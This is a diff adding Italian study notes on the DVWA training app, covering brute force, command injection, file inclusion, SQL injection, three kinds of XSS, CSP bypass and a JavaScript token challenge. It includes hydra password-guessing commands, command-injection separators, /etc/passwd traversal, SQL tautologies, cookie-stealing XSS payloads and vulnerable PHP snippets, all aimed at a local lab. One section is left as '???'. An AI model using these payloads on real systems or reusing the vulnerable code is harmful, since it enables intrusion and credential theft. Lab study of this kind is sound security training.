@@ -7,6 +7,16 @@
   - [Command injection](#command-injection)
   - [CSRF](#csrf)
   - [File inclusion](#file-inclusion)
+  - [File upload](#file-upload)
+  - [Insecure CAPTCHA](#insecure-captcha)
+  - [SQL injection](#sql-injection)
+  - [SQL injection (blind)](#sql-injection-blind)
+  - [Weak session IDs](#weak-session-ids)
+  - [XSS (DOM)](#xss-dom)
+  - [XSS (Reflected)](#xss-reflected)
+  - [XSS (Stored)](#xss-stored)
+  - [CSP Bypass](#csp-bypass)
+  - [Javascript](#javascript)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -15,12 +25,16 @@
 > http://www.dvwa.co.uk/
 
 - DVWA
-	- Host: 172.0.17.2
+	- Host: 172.17.0.2
 	- Default credentials: admin/password
 - Malicious web server
-	- Host: 172.0.17.3
+	- Host: 172.17.0.3
 
 ## Brute force
+
+### Brute force - Low
+
+Exploit:
 
 - recupera un PHPSESSID valido (`$1`)
 
@@ -28,19 +42,37 @@
 
 	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`
 
-	"RELATIVE PATH:PARAMETERS:FAILED LOGIN TEXT:REQUEST COOKIES"
+	"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"
+
+### Brute force - Medium
+
+Exploit:
+
+- recupera un PHPSESSID valido (`$1`)
+
+- lancia:
+
+	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" -c 3`
 
 ## Command injection
 
-- inserisci i seguenti valori:
+I valori dati in input dall'utente non vengono opportunamente sanitizzati.
 
-	`; CMD`
+## Command injection - Low
 
-	`&& CMD`
+- inietta il comando CMD inserendo i seguenti valori:
 
-	`& CMD`
+	- `8.8.8.8; CMD`
+	- `8.8.8.8 && CMD`
+	- `8.8.8.8 & CMD`
+	- `8.8.8.8 | CMD`
 
-	`| CMD`
+## Command injection - Medium
+
+- inietta il comando CMD inserendo i seguenti valori:
+
+	- `8.8.8.8 & CMD`
+	- `8.8.8.8 | CMD`
 
 ## CSRF
 
@@ -118,7 +150,7 @@ Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che ese
 
 		http://localhost/vulnerabilities/fi/?page=/etc/passwd
 
-#### PHP
+**PHP**
 
 Funzioni che includono un file per l'esecuzione sono `include` e `require`.
 La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
@@ -154,7 +186,7 @@ Exploit:
 /vulnerable.php?language=../../../../../proc/self/environ%00
 ```
 
-#### JSP
+**JSP**
 
 Anche le JSP sono vulnerabili a Null byte injection (`%00`)
 
@@ -232,4 +264,103 @@ Codice vulnerabile:
 Exploit:
 
 `' or '1'='1`
+
+## Weak session IDs
+
+???
+
+## XSS (DOM)
+
+Il payload viene eseguito in modo da modificare sul browser della vittima un elemento DOM, usato originariamente dallo script client-side.
+
+Codice vulnerabile:
+
+`http://www.some.site/page.html?default=French`
+
+```
+<select><script>
+
+document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
+
+document.write("<OPTION value=2>English</OPTION>");
+
+</script></select>
+```
+
+Exploit:
+
+```
+http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
+```
+
+## XSS (Reflected)
+
+Lo script viene attivato attraverso un link, che invia una richiesta a un sito vulnerabile che permette l'esecuzione dello script malevolo.
+La vulnerabilità è dovuta all'insufficiente sanitizzazione delle richieste.
+
+Codice Vulnerabile
+
+```
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+```
+
+Exploit
+
+```
+http://localhost/vulnerabilities/xss_r/?name=Frodo <script>alert(document.cookie)</script>
+```
+
+## XSS (Stored)
+
+Si ha uno Stored XSS quando non viene fatta un'adeguata input validation sulle informazioni inserite dal client.
+Il numero di potenziali vittime cresce.
+
+Codice Vulnerabile:
+
+```
+// Update database
+$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+```
+
+Exploit:
+
+Name*: `Frodo`
+
+Message*: `To Mordor<script>alert('XSS')</script>`
+
+## CSP Bypass
+
+Il response header Content Security Policy (CSP) permette di ridurre i rischi di XSS sui browser moderni, dichiarando quali risorse dinamiche è consentito caricare.
+
+Codice vulnerabile:
+
+```
+$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.
+
+...
+
+$page[ 'body' ] .= "
+    <script src='" . $_POST['include'] . "'></script>
+";
+```
+
+Exploit:
+
+- carica il codice malevolo su https://pastebin.com
+
+- recupera l'URL per il codice RAW
+
+- inserisci l'URL nell'`Include`
+
+## Javascript
+
+La passphrase è `success` ma bisogna inviare il token giusto (quello impostato di default non è calcolato correttamente).
+
+- da console web (`F12` -> `Console`) lancia `md5(rot13("success"))`
+
+- sostituisci il valore ottenuto nel tag `input` nascosto presente nella pagina
 
